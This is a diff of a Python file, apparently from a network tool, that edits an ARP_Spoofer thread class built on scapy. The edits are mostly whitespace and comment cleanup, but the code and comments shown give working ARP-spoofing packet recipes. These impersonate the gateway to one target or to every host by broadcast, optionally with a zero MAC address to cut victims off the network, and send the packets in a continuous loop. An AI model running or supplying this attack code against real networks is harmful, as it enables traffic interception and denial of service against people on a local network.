@@ -33,6 +33,7 @@ class ARP_Spoofer(threading.Thread):
             As a Thread, it can also have any of a thread parameters. See
             help(threading.Thread) for more help.
         """
+        
         super().__init__()
         self.exit_event = exit_event
         self.target = target
@@ -41,27 +42,19 @@ class ARP_Spoofer(threading.Thread):
         self.timeout = timeout
         self.disconnect = disconnect
     
+    
     def _make_packet(self):
         """Makes the ARP packet according to the constructor parameters.
         
         Returns:
             scapy.packet.Packet: ARP packet that will be sent to perform the
-                ARP Spoofing attack."""
+                ARP Spoofing attack.
+        """
         
         #single objective: ARP(pdst=self.target, psrc=self.gateway)
         #single objective dc: ARP(pdst=self.target, psrc=self.gateway, hwsrc="00:00:00:00:00:00")
         #all: Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc=self.gateway)
         #all dc: Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc=self.gateway, hwsrc="00:00:00:00:00:00")
-        
-        # ~ #if self.disconnect, hwsrc is error mac. if not, it is default mac.
-        # ~ p_hwsrc = None if not self.disconnect else "00:00:00:00:00:00"
-        
-        # ~ #if target is "all", pdst should be None
-        # ~ p_pdst = self.target if self.target != "all" else None
-        
-        
-        # ~ p = ARP(pdst = p_pdst, psrc = self.gateway, hwsrc = p_hwsrc)
-        # ~ if self.target == "all": p = Ether(dst="ff:f
         
         if self.target == "everyone":
             log.arps.warning("target_everyone")
@@ -80,10 +73,10 @@ class ARP_Spoofer(threading.Thread):
         
         Sends continuosly ARP packets to the target.
         """
+        
         log.arps.info("start", target=self.target, interval=self.interval, timeout=self.timeout, disconnect=str(self.disconnect))
     
         a = self._make_packet()
-        
         
         if a.haslayer("Ether"): my_send = sendp
         else:                   my_send = send
@@ -96,9 +89,6 @@ class ARP_Spoofer(threading.Thread):
         else:
             while not self.exit_event.is_set():
                 my_send(a, inter=self.interval, count=1, verbose=0)
-
         
         log.arps.info("finish", target=self.target, gateway=self.gateway, disconnect=self.disconnect)
-            
-
-    
+        
